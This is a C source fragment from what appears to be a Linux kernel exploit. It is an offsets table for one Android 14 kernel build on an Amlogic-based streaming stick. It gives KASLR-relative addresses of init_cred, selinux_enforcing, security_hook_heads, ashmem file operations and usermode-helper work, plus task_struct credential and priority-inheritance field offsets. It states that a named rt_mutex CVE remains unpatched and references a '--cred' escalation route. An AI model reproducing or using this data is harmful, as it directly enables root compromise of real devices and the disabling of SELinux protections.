/* onn. 2K Streaming Stick (XNA) / onn_2k_gtv - Amlogic S905Y4
 * Kernel: 5.15.196-android14-11-g27393a1fd000
 * Built 2026-03-05, clang 17.0.2 (PGO+BOLT+LTO), Android 14
 *
 * aarch64 kernel with 32-bit (armeabi-v7a) userspace.
 * KASLR active (arm64 rounds the offset to 2 MB -> runtime _text is the
 * 2 MB-aligned anchor `min_ip & ~0x1fffff`).  Symbol offsets below are the
 * kernel's link-time offsets from _text (0xffffffc008000000), recovered from
 * boot.img kallsyms (CONFIG_KALLSYMS_ALL).
 *
 * Struct offsets verified by disassembly of this exact build:
 *   commit_creds/prepare_creds -> real_cred=0x650, cred=0x658
 *   remove_waiter              -> pi_lock=0x744, pi_blocked_on=0x770
 *   task_blocks_on_rt_mutex    -> pi_waiters=0x758 (rb_root) / +0x760
 *   rt_mutex_setprio           -> pi_top_task=0x768
 *   sched_move_task            -> sched_task_group=0x2d0
 *   init_task dump             -> prio=0x7c, normal_prio=0x84, comm=0x668
 *   init_cred dump             -> cap_eff=0x38, security=0x78, user=0x80,
 *                                 user_ns=0x88, ucounts=0x90, group_info=0x98
 *   ashmem_fops dump           -> 5.15 file_operations layout (no fop_flags)
 *   mm_cache_init              -> kmem_cache_create_usercopy("mm_struct",
 *                                 sizeof(mm_struct)+cpumask_size = 0x3a8 = 936)
 *                                 -> object stride ALIGN(936,64) = 960
 *
 * CVE-2026-43499 is still present in this build: remove_waiter clears
 * current->pi_blocked_on (sp_el0) instead of waiter->task->pi_blocked_on.
 */

OFFSETS_ENTRY("5.15.196-android14-11-g27393a1fd000",
  /* Amlogic kernel load address convention.  The --cred route does not use
   * the physical alias (data_addr) at all, so this only affects the fops /
   * slide routes and diagnostics; override at runtime with KPHYS=0x... */
  .kernel_phys_load = 0x1080000,
  .phys_offset = 0x0,
  .kimage_text_base = 0xffffffc008000000ULL,

  .off_init_task          = 0x0193C200ULL,
  .off_init_cred          = 0x0194CBB8ULL,
  .off_init_uts_ns        = 0x0193AB28ULL,
  .off_empty_zero_page    = 0x01B0C000ULL,
  .off_root_task_group    = 0x01B12DC0ULL,
  .off_selinux_enforcing  = 0x01B50370ULL,
  .off_kptr_restrict      = 0x0192BD00ULL,
  .off_selinux_blob_sizes = 0x01649198ULL,
  .off_security_hook_heads= 0x01646D00ULL,
  .off_kmalloc_caches     = 0x016467E0ULL,
  .off_anon_pipe_buf_ops  = 0x0145C198ULL,
  .off_ashmem_misc_fops   = 0x019F4DA8ULL, /* ashmem_misc + 0x10 (.fops) */
  .off_ashmem_fops        = 0x015884F0ULL,
  .off_ashmem_ioctl       = 0x008D9CB8ULL,
  .off_ashmem_compat_ioctl= 0x008DA5C0ULL, /* compat_ashmem_ioctl */
  .off_ashmem_mmap        = 0x008DA614ULL,
  .off_ashmem_open        = 0x008DA7BCULL,
  .off_ashmem_release     = 0x008DA840ULL,
  .off_ashmem_show_fdinfo = 0x008DA8CCULL,
  .off_configfs_read_iter = 0x003432D8ULL,
  .off_configfs_bin_write_iter = 0x00343780ULL,
  .off_copy_splice_read   = 0,          /* not present in 5.15 */
  .off_noop_llseek        = 0x002949BCULL,
  .off_cap_capable_active = 0,          /* unused by this code */
  .off_slide_nfulnl_logger= 0x0192FEA0ULL,
  .off_slide_loggers_0_1  = 0x0192FDC8ULL,
  .off_slide_boot_id      = 0x01B67FE9ULL, /* sysctl_bootid */

  .off_system_unbound_wq  = 0x0192AE48ULL,
  .off_call_usermodehelper_exec_work = 0x000775E4ULL,

  .off_init_user_ns        = 0x0194B800ULL,
  .off_init_user_ns_device = 0x0194B800ULL,
  .off_selinux_enforcing_device = 0x01B50370ULL,

  /* task_struct field offsets (this build) */
  .task_prio = 0x7C,
  .task_normal_prio = 0x84,
  .task_sched_task_group = 0x2D0,
  .task_pi_lock = 0x744,
  .task_pi_waiters = 0x758,
  .task_pi_top_task = 0x768,
  .task_pi_blocked_on = 0x770,
  .task_pid = 0,
  .task_tgid = 0,
  .task_real_parent = 0,
  .task_atomic_flags = 0,
  .task_real_cred = 0x650,
  .task_cred = 0x658,
  .task_comm = 0x668,
  .task_tasks = 0,
  .task_seccomp = 0,
  .mm_owner = 0x348, /* mm_struct.owner; not used by --cred, verify if needed */
  .waiter_compact = 1,
  .mm_struct_sz = 960, /* ALIGN(sizeof(mm_struct)+cpumask_size, 64) */

  /* file_operations (5.15 layout, no fop_flags) */
  .fops_llseek = 0x08,
  .fops_read = 0x10,
  .fops_write = 0x18,
  .fops_read_iter = 0x20,
  .fops_write_iter = 0x28,
  .fops_open = 0x70,
  .fops_release = 0x80,
  .fops_splice_read = 0xC8,
  .fops_show_fdinfo = 0xE0,
),
